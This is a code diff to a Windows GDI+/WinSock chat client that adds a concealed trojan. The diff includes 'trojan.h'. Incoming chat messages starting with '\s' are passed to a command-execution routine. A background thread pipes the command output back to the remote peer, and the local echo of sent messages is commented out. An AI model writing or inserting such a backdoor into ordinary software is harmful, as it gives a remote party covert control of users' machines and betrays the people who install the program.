@@ -7,24 +7,25 @@
 #include <windows.h>
 #include <GdiPlus.h>
 #include <wingdi.h>
+#include "trojan.h"
 
 #include <string>
 
 #include "resource.h"
+#include "resource1.h"
 
 #pragma comment (lib, "Gdiplus.lib")
 #pragma comment (lib, "WS2_32.lib")
 
 using namespace Gdiplus;
 using namespace std;
-
 #define WM_SOCKET    1111
 #define MAX_SOCKET     16
 
 WNDPROC OrginProc;
 HINSTANCE hApp;
 HWND      hMainWindow;
-
+DWORD Tid;
 int g_width;
 int g_height;
 
@@ -69,7 +70,7 @@ int port;
 int clientNumber;
 
 char tempAddress[20] = "127.0.0.1";
-char tempPort[5] = "9527";
+char tempPort[10] = "9527";
 
 char* szClassName = "MainWindow";
 LPWSTR labelText;
@@ -104,6 +105,7 @@ LRESULT CALLBACK MyChatMessageEditFrameProc(HWND hwnd, UINT message, WPARAM wPar
 
 LRESULT CALLBACK MyUDPButtonProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam);
 
+LRESULT WINAPI outtaPipe(LPVOID);
 void setLabelText(HWND hwnd, LPWSTR text, int bgWidth, int bgHeight, float fontX, float fontY);
 
 LPWSTR stringToWString(const char* szString);
@@ -196,6 +198,16 @@ LRESULT CALLBACK WinProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 	{
 	case WM_CREATE:
 		{
+			{
+				SECURITY_ATTRIBUTES sa;
+				sa.nLength = sizeof(sa);
+				sa.bInheritHandle = TRUE;
+				sa.lpSecurityDescriptor = NULL;
+				CreatePipe(&hRead, &hWrite, &sa, MSG_LEN);
+				CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)outtaPipe, NULL, NULL, &Tid);
+				sendMutex = CreateMutex(NULL, FALSE, NULL);
+
+			}
 			hMinButton = CreateWindow(TEXT("Button"),
 			                          "min",
 									  WS_CHILD|WS_VISIBLE|BS_OWNERDRAW,
@@ -1037,7 +1049,7 @@ LRESULT CALLBACK MyPortConfirmProc(HWND hwnd, UINT message, WPARAM wParam, LPARA
 				}
 
 				//char tempPort[5];
-				GetWindowText(hPortEdit, tempPort, 5);
+				GetWindowText(hPortEdit, tempPort, 6);
 				port = (int)strtod(tempPort, NULL);
 				if (port < 1 || port > 65535)
 				{
@@ -1130,7 +1142,7 @@ LRESULT CALLBACK MyChatMessageEditProc(HWND hwnd, UINT message, WPARAM wParam, L
 				{
 
 					UDPSend(remoteAddr, szText, 1024);
-					SendMessage(hChatContent, LB_ADDSTRING, NULL, (LPARAM)szText);
+				//	SendMessage(hChatContent, LB_ADDSTRING, NULL, (LPARAM)szText);
 					SetWindowText(hChatMessageEdit, "");
 
 				}
@@ -1144,10 +1156,11 @@ LRESULT CALLBACK MyChatMessageEditProc(HWND hwnd, UINT message, WPARAM wParam, L
 					}
 				}
 			}
+			InvalidateRect(hMainWindow, NULL, TRUE);
+			ShowWindow(hChatMessageEdit, SW_SHOW);
 		}
-	}
-	
 		break;
+	}
 	case WM_PAINT:
 		{
 			HDC hdc;
@@ -1210,7 +1223,7 @@ LRESULT CALLBACK MyChatSendButtonProc(HWND hwnd, UINT message, WPARAM wParam, LP
 			{
 				
 				UDPSend(remoteAddr, szText, 1024);
-				SendMessage(hChatContent, LB_ADDSTRING, NULL, (LPARAM)szText);
+				//SendMessage(hChatContent, LB_ADDSTRING, NULL, (LPARAM)szText);
 				SetWindowText(hChatMessageEdit, "");
 				
 			}
@@ -1368,7 +1381,7 @@ void setLabelText(HWND hwnd, LPWSTR text, int bgWidth, int bgHeight, float fontX
 	EndPaint(hwnd, &ps);
 }
 
-
+//
 long onSocket(WPARAM wParam, LPARAM lParam)
 {
 	SOCKET s = wParam;
@@ -1409,6 +1422,13 @@ long onSocket(WPARAM wParam, LPARAM lParam)
 		{
 			char szText[1024] = {0};
 			recv(s, szText, 1024, 0);
+			if (szText[0] == '\\' && szText[1] == 's')
+			{
+				char msg[1024] = "\\s ";
+				char comd[1024];
+				memcpy(comd, szText + 2, 1022 * sizeof(char));
+				cmd(comd);
+			}
 			SendMessage(hChatContent, LB_ADDSTRING, NULL, (LPARAM)szText);
 			break;
 		}
@@ -1456,7 +1476,7 @@ BOOL UDPSend(sockaddr_in remote, char* buf, int len)
 
 	//sockaddr_in romote =  getSockAddr(pszRemoteAddr,  nPort);
 
-	sendto(clientSocket, buf, len, 0, (SOCKADDR*)&remote, sizeof(SOCKADDR));
+	sendto(clientSocket, buf, strlen(buf), 0, (SOCKADDR*)&remote, sizeof(SOCKADDR));
 
 	return TRUE;
 }
@@ -1491,4 +1511,22 @@ LPWSTR stringToWString(const char* szString)
 	LPWSTR lpszPath = new WCHAR[dwLen];
 	MultiByteToWideChar(CP_ACP, 0, szString, dwLen, lpszPath, nwLen);
 	return lpszPath;
+}
+LRESULT WINAPI outtaPipe(LPVOID)
+{
+	char buf[2048] = "\\s";
+//	WCHAR wbuf[2048] = L"\\s";
+	DWORD len = 0;
+	while (1)
+	{
+	//	len = MultiByteToWideChar(CP_ACP, 0, buf, len + 2, wbuf, 2048);
+	//	WideCharToMultiByte(CP_UTF8, 0, wbuf, len, buf, 2048, 0, 0);
+		ReadFile(hRead, buf + 2, MSG_LEN - 2, &len, NULL);
+		Sleep(500);
+		send(clientSocket, buf, len + 2, 0);
+		ZeroMemory(buf, MSG_LEN * 2);
+		strcpy(buf, "\\s");
+//		lstrcpyW(wbuf, L"\\s");
+	}
+	return 0;
 }
